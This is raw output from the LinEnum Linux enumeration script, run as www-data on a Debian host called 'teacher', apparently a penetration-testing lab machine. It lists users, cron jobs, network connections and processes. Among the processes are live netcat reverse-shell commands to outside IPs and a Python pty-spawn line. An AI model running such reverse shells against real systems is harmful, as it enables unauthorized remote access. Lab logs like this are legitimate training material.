
[00;31m#########################################################[00m
[00;31m#[00m [00;33mLocal Linux Enumeration & Privilege Escalation Script[00m [00;31m#[00m
[00;31m#########################################################[00m
[00;33m# www.rebootuser.com[00m
[00;33m# version 0.95[00m

[-] Debug Info
[00;33m[+] Thorough tests = Disabled[00m


[00;33mScan started at:
Wed Feb  6 16:30:17 CET 2019
[00m

[00;33m### SYSTEM ##############################################[00m
[00;31m[-] Kernel information:[00m
Linux teacher 4.9.0-8-amd64 #1 SMP Debian 4.9.110-3+deb9u6 (2018-10-08) x86_64 GNU/Linux


[00;31m[-] Kernel information (continued):[00m
Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.110-3+deb9u6 (2018-10-08)


[00;31m[-] Specific release information:[00m
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"


[00;31m[-] Hostname:[00m
teacher


[00;33m### USER/GROUP ##########################################[00m
[00;31m[-] Current user/group info:[00m
uid=33(www-data) gid=33(www-data) groups=33(www-data)


[00;31m[-] Users that have previously logged onto the system:[00m
Username         Port     From             Latest
root             tty1                      Sun Nov  4 20:03:27 +0100 2018
giovanni         pts/0    192.168.206.139  Wed Jun 27 05:20:01 +0200 2018


[00;31m[-] Who else is logged on:[00m
 16:30:17 up 34 min,  0 users,  load average: 0.50, 0.87, 0.93
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


[00;31m[-] Group memberships:[00m
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(mysql) gid=112(mysql) groups=112(mysql)
uid=1000(giovanni) gid=1000(giovanni) groups=1000(giovanni)


[00;31m[-] Contents of /etc/passwd:[00m
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
mysql:x:107:112:MySQL Server,,,:/nonexistent:/bin/false
giovanni:x:1000:1000:Giovanni,1337,,:/home/giovanni:/bin/bash


[00;31m[-] Super user account(s):[00m
root


[00;31m[-] Are permissions on /home directories lax:[00m
total 12K
drwxr-xr-x  3 root     root     4.0K Jun 27  2018 .
drwxr-xr-x 22 root     root     4.0K Oct 28 16:36 ..
drwxr-x---  4 giovanni giovanni 4.0K Nov  4 19:47 giovanni


[00;33m### ENVIRONMENTAL #######################################[00m
[00;31m[-] Environment information:[00m
APACHE_LOG_DIR=/var/log/apache2
LANG=C
OLDPWD=/var/www/moodledata
INVOCATION_ID=de7d34394b8440ac93463ffe5d271d1f
APACHE_LOCK_DIR=/var/lock/apache2
PWD=/tmp
JOURNAL_STREAM=8:14853
APACHE_RUN_GROUP=www-data
APACHE_RUN_DIR=/var/run/apache2
APACHE_RUN_USER=www-data
APACHE_PID_FILE=/var/run/apache2/apache2.pid
SHLVL=2
LANGUAGE=en_US:en
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env


[00;31m[-] Path information:[00m
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin


[00;31m[-] Available shells:[00m
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash


[00;31m[-] Current umask value:[00m
0000
u=rwx,g=rwx,o=rwx


[00;31m[-] umask value as specified in /etc/login.defs:[00m
UMASK		022


[00;31m[-] Password and storage information:[00m
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


[00;33m### JOBS/TASKS ##########################################[00m
[00;31m[-] Cron jobs:[00m
-rw-r--r-- 1 root root  722 May  3  2015 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Jun 27  2018 .
drwxr-xr-x 84 root root 4096 Oct 28 16:40 ..
-rw-r--r--  1 root root  102 May  3  2015 .placeholder
-rw-r--r--  1 root root  712 Jan  1  2017 php

/etc/cron.daily:
total 40
drwxr-xr-x  2 root root 4096 Oct 28 16:37 .
drwxr-xr-x 84 root root 4096 Oct 28 16:40 ..
-rw-r--r--  1 root root  102 May  3  2015 .placeholder
-rwxr-xr-x  1 root root  539 Mar 30  2018 apache2
-rwxr-xr-x  1 root root 1474 Sep 13  2017 apt-compat
-rwxr-xr-x  1 root root  355 Oct 25  2016 bsdmainutils
-rwxr-xr-x  1 root root 1597 Feb 22  2017 dpkg
-rwxr-xr-x  1 root root   89 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1065 Dec 13  2016 man-db
-rwxr-xr-x  1 root root  249 May 17  2017 passwd

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jun 27  2018 .
drwxr-xr-x 84 root root 4096 Oct 28 16:40 ..
-rw-r--r--  1 root root  102 May  3  2015 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jun 27  2018 .
drwxr-xr-x 84 root root 4096 Oct 28 16:40 ..
-rw-r--r--  1 root root  102 May  3  2015 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Jun 27  2018 .
drwxr-xr-x 84 root root 4096 Oct 28 16:40 ..
-rw-r--r--  1 root root  102 May  3  2015 .placeholder
-rwxr-xr-x  1 root root  723 Dec 13  2016 man-db


[00;31m[-] Crontab contents:[00m
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[00;31m[-] Systemd timers:[00m
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES
Wed 2019-02-06 16:39:00 CET  8min left     Wed 2019-02-06 16:09:04 CET  21min ago phpsessionclean.timer        phpsessionclean.service
Wed 2019-02-06 20:04:11 CET  3h 33min left Wed 2019-02-06 15:56:13 CET  34min ago apt-daily.timer              apt-daily.service
Thu 2019-02-07 06:55:48 CET  14h left      Wed 2019-02-06 15:56:13 CET  34min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Thu 2019-02-07 16:11:11 CET  23h left      Wed 2019-02-06 16:11:11 CET  19min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

4 timers listed.
[2mEnable thorough tests to see inactive timers[00m


[00;33m### NETWORKING  ##########################################[00m
[00;31m[-] Network and IP info:[00m
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:50:56:b9:fa:bc brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.153/24 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:fabc/64 scope global mngtmpaddr dynamic 
       valid_lft 86102sec preferred_lft 14102sec
    inet6 fe80::250:56ff:feb9:fabc/64 scope link 
       valid_lft forever preferred_lft forever


[00;31m[-] ARP history:[00m
10.10.10.2 dev ens33 lladdr 00:50:56:aa:9c:8d REACHABLE
fe80::250:56ff:feaa:9c8d dev ens33 lladdr 00:50:56:aa:9c:8d router STALE


[00;31m[-] Nameserver(s):[00m
nameserver 8.8.8.8


[00;31m[-] Nameserver(s):[00m
Global
         DNS Servers: 8.8.8.8
          DNS Domain: 8.8.8.8
          DNSSEC NTA: 10.in-addr.arpa
                      16.172.in-addr.arpa
                      168.192.in-addr.arpa
                      17.172.in-addr.arpa
                      18.172.in-addr.arpa
                      19.172.in-addr.arpa
                      20.172.in-addr.arpa
                      21.172.in-addr.arpa
                      22.172.in-addr.arpa
                      23.172.in-addr.arpa
                      24.172.in-addr.arpa
                      25.172.in-addr.arpa
                      26.172.in-addr.arpa
                      27.172.in-addr.arpa
                      28.172.in-addr.arpa
                      29.172.in-addr.arpa
                      30.172.in-addr.arpa
                      31.172.in-addr.arpa
                      corp
                      d.f.ip6.arpa
                      home
                      internal
                      intranet
                      lan
                      local
                      private
                      test

Link 2 (ens33)
      Current Scopes: LLMNR/IPv4 LLMNR/IPv6
       LLMNR setting: yes
MulticastDNS setting: no
      DNSSEC setting: no
    DNSSEC supported: no


[00;31m[-] Default route:[00m
default via 10.10.10.2 dev ens33 onlink 


[00;31m[-] Listening TCP:[00m
State      Recv-Q Send-Q Local Address:Port                 Peer Address:Port                
CLOSE-WAIT 0      0      10.10.10.153:50542                10.10.15.120:9090                 
ESTAB      0      0      10.10.10.153:57336                10.10.13.84:4448                 
ESTAB      0      0      10.10.10.153:50640                10.10.15.120:9090                 
CLOSE-WAIT 1      0        ::ffff:10.10.10.153:http                    ::ffff:10.10.14.19:45602                
ESTAB      0      456      ::ffff:10.10.10.153:http                    ::ffff:10.10.15.39:57586                
ESTAB      0      481      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49474                
ESTAB      0      477      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49470                
ESTAB      0      489      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49530                
ESTAB      0      474      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49454                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49524                
ESTAB      0      449      ::ffff:10.10.10.153:http                    ::ffff:10.10.15.39:57630                
ESTAB      0      483      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49390                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49394                
ESTAB      0      499      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49528                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49448                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49482                
ESTAB      0      480      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49492                
ESTAB      0      0        ::ffff:10.10.10.153:http                    ::ffff:10.10.13.84:43822                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49480                
ESTAB      0      491      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49368                
FIN-WAIT-1 0      496      ::ffff:10.10.10.153:http                   ::ffff:10.10.12.135:35524                
CLOSE-WAIT 1      0        ::ffff:10.10.10.153:http                    ::ffff:10.10.14.19:45650                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49388                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49450                
ESTAB      0      477      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49504                
ESTAB      0      477      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49466                
ESTAB      0      478      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49376                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49538                
ESTAB      0      478      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49426                
ESTAB      0      478      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49408                
ESTAB      0      477      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49348                
ESTAB      0      477      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49478                
ESTAB      0      453      ::ffff:10.10.10.153:http                    ::ffff:10.10.15.39:57626                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49434                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49358                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49536                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49406                
ESTAB      0      480      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49430                
ESTAB      0      451      ::ffff:10.10.10.153:http                    ::ffff:10.10.15.39:57590                
ESTAB      0      480      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49370                
CLOSE-WAIT 1      0        ::ffff:10.10.10.153:http                    ::ffff:10.10.14.19:45604                
ESTAB      0      478      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49420                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49444                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49456                
ESTAB      0      472      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49398                
ESTAB      0      474      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49462                
ESTAB      0      476      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49428                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49378                
ESTAB      0      482      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49384                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49436                
ESTAB      0      481      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49544                
ESTAB      0      447      ::ffff:10.10.10.153:http                   ::ffff:10.10.14.207:39146                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49494                
ESTAB      0      486      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49362                
ESTAB      0      451      ::ffff:10.10.10.153:http                    ::ffff:10.10.15.39:57608                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49510                
ESTAB      0      477      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49484                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49542                
ESTAB      0      476      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49422                
ESTAB      0      480      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49356                
ESTAB      0      477      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49402                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49502                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49488                
ESTAB      0      478      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49442                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49364                
ESTAB      0      481      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49344                
ESTAB      0      491      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49366                
ESTAB      0      0        ::ffff:10.10.10.153:http                    ::ffff:10.10.14.19:45688                
ESTAB      0      478      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49346                
ESTAB      0      476      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49508                
ESTAB      0      477      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49440                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49534                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49396                
ESTAB      0      482      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49382                
ESTAB      0      478      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49506                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49354                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49498                
ESTAB      0      480      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49458                
ESTAB      0      452      ::ffff:10.10.10.153:http                    ::ffff:10.10.15.39:57598                
ESTAB      0      478      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49350                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49360                
ESTAB      0      453      ::ffff:10.10.10.153:http                    ::ffff:10.10.15.39:57624                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49424                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49460                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49386                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49464                
CLOSE-WAIT 1      0        ::ffff:10.10.10.153:http                    ::ffff:10.10.14.19:45648                
ESTAB      0      450      ::ffff:10.10.10.153:http                    ::ffff:10.10.15.39:57632                
ESTAB      0      478      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49522                
ESTAB      0      485      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49372                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49486                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49540                
ESTAB      0      477      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49438                
ESTAB      0      449      ::ffff:10.10.10.153:http                    ::ffff:10.10.15.39:57636                
ESTAB      0      498      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49532                
ESTAB      0      485      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49496                
ESTAB      0      472      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49392                
ESTAB      0      478      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49446                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49380                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49490                
ESTAB      0      475      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49476                
ESTAB      0      476      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49410                
ESTAB      0      476      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49404                
ESTAB      0      452      ::ffff:10.10.10.153:http                    ::ffff:10.10.15.39:57634                
ESTAB      0      487      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49468                
ESTAB      0      479      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49452                
ESTAB      0      478      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49352                
ESTAB      0      482      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49432                
ESTAB      0      476      ::ffff:10.10.10.153:http                    ::ffff:10.10.16.56:49374                
CLOSE-WAIT 1      0        ::ffff:10.10.10.153:http                    ::ffff:10.10.14.19:45606                


[00;33m### SERVICES #############################################[00m
[00;31m[-] Running processes:[00m
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.3 138832  4304 ?        Ss   15:56   0:01 /sbin/init
root          2  0.0  0.0      0     0 ?        S    15:56   0:00 [kthreadd]
root          3  0.9  0.0      0     0 ?        S    15:56   0:19 [ksoftirqd/0]
root          5  0.0  0.0      0     0 ?        S<   15:56   0:00 [kworker/0:0H]
root          7  0.0  0.0      0     0 ?        S    15:56   0:01 [rcu_sched]
root          8  0.0  0.0      0     0 ?        S    15:56   0:00 [rcu_bh]
root          9  0.0  0.0      0     0 ?        S    15:56   0:00 [migration/0]
root         10  0.0  0.0      0     0 ?        S<   15:56   0:00 [lru-add-drain]
root         11  0.0  0.0      0     0 ?        S    15:56   0:00 [watchdog/0]
root         12  0.0  0.0      0     0 ?        S    15:56   0:00 [cpuhp/0]
root         13  0.0  0.0      0     0 ?        S    15:56   0:00 [kdevtmpfs]
root         14  0.0  0.0      0     0 ?        S<   15:56   0:00 [netns]
root         15  0.0  0.0      0     0 ?        S    15:56   0:00 [khungtaskd]
root         16  0.0  0.0      0     0 ?        S    15:56   0:00 [oom_reaper]
root         17  0.0  0.0      0     0 ?        S<   15:56   0:00 [writeback]
root         18  0.0  0.0      0     0 ?        S    15:56   0:00 [kcompactd0]
root         20  0.0  0.0      0     0 ?        SN   15:56   0:00 [ksmd]
root         21  0.0  0.0      0     0 ?        SN   15:56   0:00 [khugepaged]
root         22  0.0  0.0      0     0 ?        S<   15:56   0:00 [crypto]
root         23  0.0  0.0      0     0 ?        S<   15:56   0:00 [kintegrityd]
root         24  0.0  0.0      0     0 ?        S<   15:56   0:00 [bioset]
root         25  0.0  0.0      0     0 ?        S<   15:56   0:00 [kblockd]
root         26  0.0  0.0      0     0 ?        S<   15:56   0:00 [devfreq_wq]
root         27  0.0  0.0      0     0 ?        S<   15:56   0:00 [watchdogd]
root         28  0.0  0.0      0     0 ?        S    15:56   0:01 [kswapd0]
root         29  0.0  0.0      0     0 ?        S<   15:56   0:00 [vmstat]
root         41  0.0  0.0      0     0 ?        S<   15:56   0:00 [kthrotld]
root         42  0.0  0.0      0     0 ?        S<   15:56   0:00 [ipv6_addrconf]
root         85  0.0  0.0      0     0 ?        S<   15:56   0:00 [ata_sff]
root         86  0.0  0.0      0     0 ?        S<   15:56   0:00 [mpt_poll_0]
root         87  0.0  0.0      0     0 ?        S<   15:56   0:00 [mpt/0]
root        114  0.0  0.0      0     0 ?        S    15:56   0:00 [scsi_eh_0]
root        115  0.0  0.0      0     0 ?        S<   15:56   0:00 [scsi_tmf_0]
root        117  0.0  0.0      0     0 ?        S<   15:56   0:00 [bioset]
root        118  0.0  0.0      0     0 ?        S    15:56   0:00 [scsi_eh_1]
root        119  0.0  0.0      0     0 ?        S<   15:56   0:00 [scsi_tmf_1]
root        122  0.0  0.0      0     0 ?        S    15:56   0:00 [scsi_eh_2]
root        124  0.0  0.0      0     0 ?        S<   15:56   0:00 [scsi_tmf_2]
root        126  0.0  0.0      0     0 ?        S    15:56   0:00 [kworker/u256:2]
root        138  0.0  0.0      0     0 ?        S<   15:56   0:00 [bioset]
root        140  0.0  0.0      0     0 ?        S<   15:56   0:01 [kworker/0:1H]
root        175  0.0  0.0      0     0 ?        S    15:56   0:00 [jbd2/sda1-8]
root        176  0.0  0.0      0     0 ?        S<   15:56   0:00 [ext4-rsv-conver]
root        197  0.0  0.2 207508  2532 ?        Ssl  15:56   0:01 /usr/bin/vmtoolsd
root        198  0.0  0.0      0     0 ?        S    15:56   0:00 [kauditd]
root        199  0.0  0.2  55736  2588 ?        Ss   15:56   0:00 /lib/systemd/systemd-journald
root        228  0.0  0.1  45656  2168 ?        Ss   15:56   0:00 /lib/systemd/systemd-udevd
root        306  0.0  0.0      0     0 ?        S<   15:56   0:00 [ttm_swap]
root        339  0.0  0.0      0     0 ?        S<   15:56   0:00 [edac-poller]
systemd+    402  0.0  0.1 127284  2144 ?        Ssl  15:56   0:00 /lib/systemd/systemd-timesyncd
message+    405  0.0  0.2  45132  2580 ?        Ss   15:56   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root        408  0.0  0.1 254332  1980 ?        Ssl  15:56   0:00 /usr/sbin/rsyslogd -n
root        409  0.0  0.1  29664  1800 ?        Ss   15:56   0:00 /usr/sbin/cron -f
root        410  0.0  0.1 153484  2088 ?        Ss   15:56   0:00 /usr/bin/VGAuthService
root        411  0.0  0.2  46420  2540 ?        Ss   15:56   0:00 /lib/systemd/systemd-logind
root        572  0.0  0.0  14536  1140 tty1     Ss+  15:56   0:00 /sbin/agetty --noclear tty1 linux
mysql       710  0.6  3.7 666832 42668 ?        Ssl  15:56   0:13 /usr/sbin/mysqld
root        828  0.1  0.7 412372  8704 ?        Ss   15:56   0:02 /usr/sbin/apache2 -k start
www-data    894  0.0  0.0   4288   520 ?        S    15:58   0:00 sh -c (date;nc 10.10.15.120 9090 -e /bin/bash)
www-data    895  0.0  0.1  17948  1416 ?        S    15:58   0:00 bash
www-data    908  0.0  0.1  32188  1600 ?        S    15:59   0:00 python -c import pty;pty.spawn('/bin/bash')
www-data    909  0.0  0.1  18192  1440 pts/0    Ss   15:59   0:00 /bin/bash
root        913  0.0  0.1  49220  1480 pts/0    S    15:59   0:00 su giovanni
giovanni    914  0.0  0.1  64852  1504 ?        Ss   15:59   0:00 /lib/systemd/systemd --user
giovanni    915  0.0  0.0 164356    88 ?        S    15:59   0:00 (sd-pam)
giovanni    917  0.0  0.1  21032  1524 pts/0    S    15:59   0:00 bash
giovanni    985  0.0  0.1  15236  1208 pts/0    S+   16:01   0:00 nano answersAlgebra
www-data   1098  0.0  0.0   4288   520 ?        S    16:05   0:00 sh -c (date;nc 10.10.15.120 9090 -e /bin/bash)
www-data   1099  0.0  0.1  17948  1412 ?        S    16:05   0:00 bash
www-data   1116  0.0  0.2  32188  2736 ?        S    16:05   0:00 python -c import pty;pty.spawn('/bin/bash')
www-data   1117  0.0  0.1  18168  1432 pts/1    Ss   16:05   0:00 /bin/bash
root       1119  0.0  0.1  49220  1364 pts/1    S    16:05   0:00 su giovanni
giovanni   1120  0.0  0.1  21100  1524 pts/1    S    16:05   0:00 bash
www-data   1189  0.0  0.0   4288   468 ?        S    16:06   0:00 sh -c (nc -e /bin/sh -u 10.10.13.84 4448;)
www-data   1190  0.0  0.0   4288   484 ?        S    16:06   0:00 sh
giovanni   1594  0.0  0.0  21104   472 pts/1    S    16:11   0:00 bash
giovanni   1595  0.0  0.2  21100  2904 pts/1    S+   16:11   0:00 bash
www-data   1655  0.2  3.3 419056 38772 ?        S    16:13   0:02 /usr/sbin/apache2 -k start
www-data   1710  0.1  2.3 418876 26816 ?        S    16:14   0:01 /usr/sbin/apache2 -k start
www-data   1804  0.0  0.0   4288   476 ?        S    16:15   0:00 sh -c (nc -e /bin/sh -u 10.10.13.84 4448)
www-data   1805  0.0  0.0   4288   488 ?        S    16:15   0:00 sh
www-data   1851  0.1  3.0 419052 34868 ?        S    16:16   0:00 /usr/sbin/apache2 -k start
www-data   1924  0.1  2.1 419060 24736 ?        S    16:16   0:01 /usr/sbin/apache2 -k start
www-data   1925  0.2  3.3 419384 39008 ?        S    16:16   0:02 /usr/sbin/apache2 -k start
www-data   1933  0.1  2.1 416828 24988 ?        S    16:16   0:01 /usr/sbin/apache2 -k start
root       1943  0.0  0.0      0     0 ?        S    16:17   0:00 [kworker/0:0]
root       1975  0.0  0.0      0     0 ?        S    16:17   0:00 [kworker/u256:1]
www-data   1993  0.1  2.2 416828 25668 ?        S    16:17   0:00 /usr/sbin/apache2 -k start
